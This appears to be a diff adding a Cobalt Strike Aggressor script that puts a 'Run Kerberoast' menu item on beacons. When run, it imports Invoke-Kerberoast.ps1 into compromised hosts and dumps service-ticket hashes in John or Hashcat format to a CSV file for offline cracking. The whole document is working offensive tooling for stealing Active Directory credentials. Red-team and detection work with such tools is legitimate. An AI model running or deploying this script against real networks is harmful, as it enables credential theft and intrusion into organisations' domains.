@@ -1,0 +1,49 @@
+sub run_kerberoast {
+    $bid = $1;
+
+    # TODO: add in credential selection
+    # may need to quote path for folders with spaces
+    # also verify that the folder exists
+
+    $filepath = $4 . "\\";
+    $filepath .= "KR-" . beacon_info($bid, "computer") . "-" . formatDate(ticks(), "yyyyMMdd'T'HHmm") . ".csv";
+
+    $kerberoast_command = "Invoke-Kerberoast ";
+    $kerberoast_command .= "-OutputFormat $2 ";
+    if ( uc($3) == "TRUE"){
+        $kerberoast_command .= "-AdminCount ";
+    }
+    $kerberoast_command .= "| ConvertTo-CSV -NoTypeInformation | Out-File " . $filepath;
+
+    bpowershell_import($bid, script_resource("kerberoast/Invoke-Kerberoast.ps1"));
+    bpowershell($bid, "$kerberoast_command");
+}
+
+popup beacon_bottom {
+    menu "Kerberoast"{
+        item "Run Kerberoast"{
+            local('$bid');
+            $dialog = dialog("Run Kerberoast", %(csvfolder => "C:\\Temp", adminonly => "True",
+                        outputformat => "John"), lambda({
+                                #declare the options and pass here
+                                $csvfolder = $3['csvfolder'];
+                                $outputformat = $3['outputformat'];
+                                $adminonly = $3['adminonly'];
+
+                                foreach $bid (@ids){
+                                    run_kerberoast($bid, $outputformat, $adminonly, $csvfolder);
+                                }
+                            }, @ids => $1));
+
+            dialog_description($dialog, "Run Simplified Kerberoast");
+            drow_text($dialog, "csvfolder", "CSV output folder (remote):");
+            drow_combobox($dialog, "outputformat", "Hash output format:", @("John", "Hashcat"));
+            drow_combobox($dialog, "adminonly", "Admins only:", @("True", "False"));
+
+            dbutton_action($dialog, "Launch");
+
+            dialog_show($dialog);
+
+        }
+    }
+}
